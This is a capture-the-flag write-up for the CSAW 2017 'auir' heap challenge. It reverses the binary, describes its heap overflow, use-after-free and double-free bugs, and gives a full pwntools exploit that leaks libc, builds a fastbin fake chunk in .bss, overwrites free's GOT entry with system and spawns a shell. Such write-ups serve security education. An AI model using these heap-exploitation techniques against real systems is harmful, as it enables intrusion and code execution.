# CSAW Quals 2017 Auir

Let's take a look at the binary:
```
$	file auir 
auir: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, stripped
$	pwn checksec auir 
[*] '/Hackery/csaw17/auir-pwn-200/auir'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

So we can see that we have a 64 bit binary, dynamically linked, stripped, and with a non executable stack. We can see that we are also given a libc file `libc-2.23.so`. Let's run the binary:

```
./auir 
|-------------------------------|
|AUIR AUIR AUIR AUIR AUIR AUIR A|
|-------------------------------|
[1]MAKE ZEALOTS
[2]DESTROY ZEALOTS
[3]FIX ZEALOTS
[4]DISPLAY SKILLS
[5]GO HOME
|-------------------------------|
>>1
[*]SPECIFY THE SIZE OF ZEALOT
>>10
[*]GIVE SOME SKILLS TO ZEALOT
>>15935728
|-------------------------------|
[1]MAKE ZEALOTS
[2]DESTROY ZEALOTS
[3]FIX ZEALOTS
[4]DISPLAY SKILLS
[5]GO HOME
|-------------------------------|
>>3
[*]WHCIH ONE DO YOU WANT TO FIX ?
>>0
[*]SPECIFY THE SIZE OF ZEALOT
>>10
[*]GIVE SOME SKILLS TO ZEALOT
>>75395128
[*]FIXED ZEALOT NUMBER:0
[*]FIXED ZEALOT SIZE:10
|-------------------------------|
[1]MAKE ZEALOTS
[2]DESTROY ZEALOTS
[3]FIX ZEALOTS
[4]DISPLAY SKILLS
[5]GO HOME
|-------------------------------|
>>4
[*]WHICH ONE DO YOU WANT TO SEE?
>>0
[*]SHOWING....
75395128|-------------------------------|
[1]MAKE ZEALOTS
[2]DESTROY ZEALOTS
[3]FIX ZEALOTS
[4]DISPLAY SKILLS
[5]GO HOME
|-------------------------------|
>>2
[*]WHICH ONE DO YOU WANT TO DESTROY?
>>0
[*]BREAKING....
[*]SUCCESSFUL!
|-------------------------------|
[1]MAKE ZEALOTS
[2]DESTROY ZEALOTS
[3]FIX ZEALOTS
[4]DISPLAY SKILLS
[5]GO HOME
|-------------------------------|
>>5
[*]NOOBS CAN'T PROTECT AUIR....
```

So we can see that we are given 5 options, to make a zealot, destroy a zealot, fix a zealot, display the skills for a zealot, and exit. 

## Reversing

So when we reverse this, it becomes clear pretty quickly that the code has been obfuscated and will be a pain to reverse. How I reversed this was I looked for strings that a particular option displayed, which would lead me to a function, and I would just skim over the C pseudocode for it. Then I would go into gdb, and verify what I saw from the function. From that we can determine that the `5` options do the following:

```
MAKE ZEALOTS:	Prompts you for a size, allocates that size in the heap with malloc, then allows you to scan in the amount of bytes allocated into the heap chunk.
DESTROY ZEALOTS: It frees the heap chunk for the zealot you give it.
FIX ZEALOTS: Allows you to scan in data into a Zealot. Does not check for an overflow.
DISPLAY SKILLS: Prints the first 8 bytes of data from the Zealot you provide it with.
GO HOME: Exits the program
```

In addition to that, we find that in the `bss` section of memory there are two interesting pieces of data:
```
0x605310:	Stores pointers for all of the Zealots allocated
0x605630:	Integer that stores the amount of Zealots allocated
```

and we can confirm that with gdb:

```
gdb-peda$ x/4g 0x605310
0x605310:	0x0000000000617c20	0x0000000000617c40
0x605320:	0x0000000000617c60	0x0000000000000000
gdb-peda$ x/x 0x605630
0x605630:	0x0000000000000003
gdb-peda$ x/s 0x617c20
0x617c20:	"15935728\n"
gdb-peda$ x/s 0x617c40
0x617c40:	"75395128\n"
```

Now what is interesting here, is that if we destroy a zealot, a pointer for it in the `bss` remains, and the integer which holds the total count stays the same. This means that even after we free the chunk of space allocated for a zealot, we can edit that spac again, and even free it again (both of which are major bugs). In addition to that, we also have the heap overflow bug from the `FIX ZEALOTS` option not checking if it is going to overflow the space it is writing to. So to sum it all up, we have a Heap Overflow bug in `FIX ZEALOTS`, and a Use After Free and Double Free bug because the `DESTROY ZEALOTS` leaves behind a pointer it frees.

## Exploitation

#### High Level Look

Now how I exploited this is based off of (and pretty similar to) these writeups for another ctf challenge from a different ctf challenge: `https://twisted-fun.github.io/2018-05-24-RCTF18-PWN-317/ https://github.com/sajjadium/ctf-writeups/tree/master/RCTF/2018/babyheap` & `https://github.com/guyinatuxedo/ctf/tree/master/0ctf/pwn/babyheap`.

Starting off, we will use the heap overflow to cause a heap consolidation, which we will use toget a libc infoleak. Proceeding that, we will use a fastbin attack to allocate a fake chunk to the bss section which stores the pointers near `0x605310`, and overwrite a pointer with the got address for `free`. Proceeding that we will write to the overwritten pointer the address of `system` (which we know what it is thanks to the infoleak). Since we have overwritten the got address of `free` with `system`, whenever we call `free` it will really call `system`. Proceeding that, we will just get a heap chunk (I reused an old one, however it shouldn't matter if it is new or old) with the string `/bin/sh`, and destory that chunk which will call `system` with the argument `/bin/sh` and we will get a shell.

#### Heap Layout Infoleak

Now here is the how I corrupted the memory. I didn't realize that it kept the pointers after freeing chunks of memory untill I was nearly done with the exploit, so a bit of this might be wierd. Starting off we will allocate four chunks of memory:

```
0:	240 bytes large:	"0"*240
1:	112 bytes large:	"1"*112
2:	240 bytes large:	"2"*240
3:	48 bytes large:		"3"*48
```

So we have allocated four chunks `0-3`. Starting off we will free chunks `0` and `1` for the heap consolidation (chunk `3` is there to prevent consolidation with the top chunk):

```
0:	240 bytes large:	"0"*240 (freed)
1:	112 bytes large:	"1"*112 (freed)
2:	240 bytes large:	"2"*240
3:	48 bytes large:		"3"*48
```

Now that we have freed chunks `0` and `1` (and because of their size) they have been added to the list of fastbins. Next we are going to allocate a space `120` bytes large, which due to it's size will go where chunk `1` was:

```
0:	240 bytes large:	"0"*240 (freed)
4:	120 bytes large:	"4"*120 also where old chunk 1 is
2:	240 bytes large:	"2"*240
3:	48 bytes large:		"3"*48
```

Proceeding that, we will use the heap overflow to the `previous_size` and `size`  values with `0x180` and `0x100`. The reson for this is due to the increased previous size, it will think that the previous chunk started where the old chunk `0` is. In addition to that, since we overflowed the size with `0x100`, the `previous_in_use_bit` will be `0`, so it will think that the previous chunk is free (also `0x100` is equivalent to `256` which is the size of chunk `2` when you factor in the `16` bytes of heap metadata):

```
0:	240 bytes large:	"0"*240 (freed)
4:	120 bytes large:	"5"*118 + p64(0x180) + p64(0x100) also where old chunk 1 is
2:	240 bytes large:	"2"*240 previous_size overwritten with 0x180, size overwritten with 0x100
3:	48 bytes large:		"3"*48
```

Proceeding that we will free chunk `2`. Due to our previous steps, this will cause a heap consolidation which will move the start of the heap back to where the old chunk `0` is. As a result, the heap will effectively forget about chunk `4` (and we will be able to allocate heap space that overlaps with it). 

```
0:	240 bytes large:	"0"*240 (freed) heap consolidated here
4:	120 bytes large:	""5"*118 + p64(0x180) + p64(0x100 Heap has effectively forgotten about this chunk : also where old chunk 1 is
2:	240 bytes large:	"2"*240 (freed)
3:	48 bytes large:		"3"*48
```

Now we the final step to prep the infoleak, we will allocate another chunk of memory that is `240` bytes large. This will go where the old chunk `0` is. This will move the address of `main_arena+88` into the data section for chunk `4`. With that we will be able to display the skills for either zealot 4 or 1, and it will display the address of `main_arena+88`, which will give us a libc address that we can use to break ASLR in the heap.

```
5:	240 bytes large:	"6"*240 overlaps with old Chunk 0
4:	120 bytes large:	Starts with Main_Arena+88 address Heap has effectively forgotten about this chunk : also where old chunk 1 is
2:	240 bytes large:	"2"*240 (freed)
3:	48 bytes large:		"3"*48
```

Proceeding that, we can just get an infoleak by displaying the skills for either chunk `1` or `4`. With that, we can calculate the `libc` base using the `libc` file they gave us, and caluclate the address of everything we will need to get RCE.

#### Heap Layout Fake Chunk

Now we will continue from the infoleak. Now our next step will be to allocate a fake chunk in the `bss` section (since it is in the `bss`, it will always have the same address so we won't need an infoleak for that). The we will just overwrite a pointer with the got address of `free`, overwrite the value there with the libc address of `system`, then we will be able to get remote code exeuction by calling `free` on a heap chunk with the string `/bin/sh`.

So starting off from the previous infoleak, we will free chunk `5` (could also work by freeing chunk `0`):

```
5 & 0:	240 bytes large:	"6"*240 (freed)
4:	120 bytes large:	Starts with Main_Arena+88 address Heap has effectively forgotten about this chunk : also where old chunk 1 is
2:	240 bytes large:	"2"*240 (freed)
3:	48 bytes large:		"3"*48
```

Now that the space where chunks `5` and `0` used to be is clear, we can split it up into multiple different chunk allocations. We will allocate one chunk of size `16` bytes, followed by three chunks that are `96` bytes large. The last chunk will overlap directly with chunk `9`:

```
6:	16 bytes large:		"7"*16
7:	96 bytes large:		"8"*96
8:	96 bytes large:		"9"*96
4 and 9:	120 and 96 bytes large:	Starts with Main_Arena+88 address Heap has effectively forgotten about this chunk 1
2:	240 bytes large:	"2"*240 (freed)
3:	48 bytes large:		"3"*48
```

Now here is where we will execute the double free. We will be trying to free the region of memory where chunk `4` is twice. However while we do this, we will need to free another chunk of memory that will be categroized as a fast bin. The reason for this being, if we free a pointer that is at the top of the fast bin list (which the last freed fast bin is), it will cause a crash and hault the program. By freeing another fast bin in between freeing chunk `4` twice, we can get around that check. Also for this step, we can use zealot `1`, `4`, or `9`:

```
6:	16 bytes large:		"7"*16
7:	96 bytes large:		"8"*96
8:	96 bytes large:		"9"*96 (freed)
4 and 9:	120 and 96 bytes large:	(starting address freed twice)
2:	240 bytes large:	"2"*240 (freed)
3:	48 bytes large:		"3"*48
```

Following that we will allocate two chunks of size `96` bytes. This will allocate an address for chunk `4` and `8`. As a result, we will have allocated chunk `4`, while it is at the top of the fast bin list. As a result, we can write the address of our fake chunk to chunk `4`. Then when we allocate chunk `4` (since it is at the top of the free list) our fake chunk will get added to the top of the fast bin list:

```
6:	16 bytes large:		"7"*16
7:	96 bytes large:		"8"*96
8 and 11:	96 bytes large:		"9"*96 (8 has been freed)
4 and 9 and 10 and 12:	120 and 96*3 bytes large:	(starting address freed twice) starts with address 0x605060
2:	240 bytes large:	"2"*240 (freed)
3:	48 bytes large:		"3"*48
``` 

Now that our fake chunk has been added to the free list, we can just allocate another chunk of similar size and we will get it:

```
6:	16 bytes large:		"7"*16
7:	96 bytes large:		"8"*96
8 and 11:	96 bytes large:		"9"*96 (8 has been freed)
4 and 9 and 10 and 12:	120 and 96*3 bytes large:	(starting address freed twice) starts with address 0x605060
2:	240 bytes large:	"2"*240 (freed)
3:	48 bytes large:		"3"*48
14:	points to bss address 0x605060
```

and we can see the pointer to the bss section in memory:

```
gdb-peda$ x/14g 0x605310
0x605310:	0x00000000024a1c20	0x00000000024a1d20
0x605320:	0x00000000024a1da0	0x00000000024a1ea0
0x605330:	0x00000000024a1d20	0x00000000024a1c20
0x605340:	0x00000000024a1c20	0x00000000024a1c40
0x605350:	0x00000000024a1cb0	0x00000000024a1d20
0x605360:	0x00000000024a1d20	0x00000000024a1cb0
0x605370:	0x00000000024a1d20	0x00000000006052fd
```

and we can see there, as the very last spot is a pointer to the bss address `0x6052fd`. Using that, we can write over the pointers for zealots. With that we can write over the got address of `free` with `system`, and just free a zealot with the string `/bin/sh`, and we will get a shell. Once again, when I wrote this exploit I didn't reverse the code as well as I should have, I missed a couple of things, and as a result the exploit that I wrote is more complicated than it needs to be.

## Exploit

Below is the source code for my exploit:

```
# This exploit is based off of and similar to this writeup for a different ctf challenge from RCTF: https://twisted-fun.github.io/2018-05-24-RCTF18-PWN-317/ https://github.com/sajjadium/ctf-writeups/tree/master/RCTF/2018/babyheap

# First import pwntools
from pwn import *

#Estbalish the target process, libc file, and attach gdb
target = process('auir', env={"LD_PRELOAD":"./libc-2.23.so"})
#gdb.attach(target)
libc = ELF('libc-2.23.so')

#Establish the functions to interact with the elf
def makeZealot(size, content):
	target.recvuntil(">>")
	target.sendline('1')
	target.recvuntil(">>")
	target.sendline(str(size))
	target.recvuntil(">>")
	target.send(content)

def destroyZealot(index):
	target.recvuntil(">>")
	target.sendline('2')
	target.recvuntil(">>")
	target.sendline(str(index))

def fixZealot(index, size, content):
	target.recvuntil(">>")
	target.sendline('3')
	target.recvuntil(">>")
	target.sendline(str(index))
	target.recvuntil(">>")
	target.sendline(str(size))
	target.recvuntil(">>")
	target.send(content)

def showZealot(index):
	target.recvuntil(">>")
	target.sendline('4')
	target.recvuntil(">>")
	target.sendline(str(index))

#This function is specifically designed to print and filter out the infoleak
def infoLeak():
	target.recvuntil(">>")
	target.sendline('4')
	target.sendline('4')
	target.recvuntil('[*]SHOWING....')
	leak = target.recv(8)
	leak = leak.replace("\x0a", "")
	leak = u64(leak + "\x00")
	system = leak - 0x37f7e8 
	libcadr = system - libc.symbols['system']
	log.info("leak is: " + hex(leak))
	log.info("System is: " + hex(system))
	log.info("Libc is: " + hex(libcadr))
	return libcadr

# First make the first four chunks of memory
makeZealot(240, "0"*(240)) # Chunk 0
makeZealot(112, "1"*(112)) # Chunk 1
makeZealot(240, "2"*(240)) # Chunk 2
makeZealot(48, "3"*(48)) # Chunk 3

# Free the first two chunks for heap consolidation
destroyZealot(0) # Chunk 0 freed
destroyZealot(1) # Chunk 1 freed

# Make chunk 5, which we will use to overflow chunk 2
makeZealot(120, "4"*(120)) # Chunk 4

# Execute the heap overflow
fixZealot(1, 128, '5'*0x70 + p64(0x180) + p64(0x100))

# Free the second heap chunk to cause heap consolidation
destroyZealot(2) # Chunk 2 now freed

# Allocate another heap space, to prepare for the infoleak
makeZealot(240, "6"*(240)) # Chunk 5

# Print the infoleak, and filter it out, and calculate the address of our fake chunk
libcadr = infoLeak()
mallocHook = libcadr + libc.symbols['__malloc_hook']
oneshot = libcadr + 0xf1117
log.info("Malloc Hook: " + hex(mallocHook))
log.info("One Shot: " + hex(oneshot))
fakeChunk = 0x605310 - 0x23

# Free chunk 5 to make room for next step
destroyZealot(5) # Chunk 5 now freed

# Allocate four more chunks to prepare for the double free
makeZealot(16, "7"*16)# Chunk 6
makeZealot(96, "8"*96)# Chunk 7
makeZealot(96, "9"*96)# Chunk 8
makeZealot(96, "x"*96)# Chunk 9

# Free the chunks of memory for the double free
destroyZealot(9)# Chunk 9 is now free
destroyZealot(8)# Chunk 8 is now free
destroyZealot(4)# Chunk 4 is now free

# Allocate two more chunks of memory, so we have a valid heap chunk that is also at the top of the fast bin list
makeZealot(96, "y"*96)# Chunk 10
makeZealot(96, "z"*96)# Chunk 11

# Write the fake chunk address to the start of the fourth chunk
fixZealot(4, 96, p64(fakeChunk) + p64(0) + "0"*80)

# Allocate the top fast bin chunk, which will cause our fake chunk to be placed at the top of the fastbin list
makeZealot(96, ">"*95)# Chunk 12

# Allocate our fake chunk
makeZealot(96, "<")# Chunk 13

# Calculate the address of system
system = libcadr + libc.symbols['system']

# Overflow the first pointer with the got address of free
fixZealot(13, 28, '\x00'*19 + p64(0x605060))

# Write over the value stored in got address of free with the libc address of system
fixZealot(0, 8, p64(system))

# Write "/bin/sh" to an allocated chunk
fixZealot(8, 8, "/bin/sh\x00")

# Call free with the argument "/bin/sh" to get a shell
destroyZealot(8)

# Drop to an interactive shell to use the shell
target.interactive()

# Here is a list of all of the overlapping chunks
'''
0 5 6 (7-8, 11 also in this region)
1 4 9 10, 12
2
3
13
'''
```

When we run it:

```
$	python exploit.py 
[!] Could not find executable 'auir' in $PATH, using './auir' instead
[+] Starting local process './auir': pid 27352
[*] '/Hackery/csaw17/auir-pwn-200/libc-2.23.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] leak is: 0x7f8126c2fb78
[*] System is: 0x7f81268b0390
[*] Libc is: 0x7f812686b000
[*] Malloc Hook: 0x7f8126c2fb10
[*] One Shot: 0x7f812695c117
[*] Switching to interactive mode
[*]BREAKING....
$ ls
auir  exploit.py    peda-session-auir.txt  peda-session-ls.txt          readme.md
core  libc-2.23.so  peda-session-dash.txt  peda-session-w.procps.txt  sh
$ w
 15:57:32 up  3:39,  1 user,  load average: 0.53, 0.38, 0.56
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu tty7     :0               12:44    3:13m  8:08   0.04s /bin/sh /usr/lib/gnome-session/run-systemd-session ubuntu-session.target
$ exit
[*]SUCCESSFUL!
|-------------------------------|
[1]MAKE ZEALOTS
[2]DESTROY ZEALOTS
[3]FIX ZEALOTS
[4]DISPLAY SKILLS
[5]GO HOME
|-------------------------------|
>>$ 5
[*]NOOBS CAN'T PROTECT AUIR....
[*] Process './auir' stopped with exit code 0 (pid 27352)
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
```

Just like that, we popped a shell!
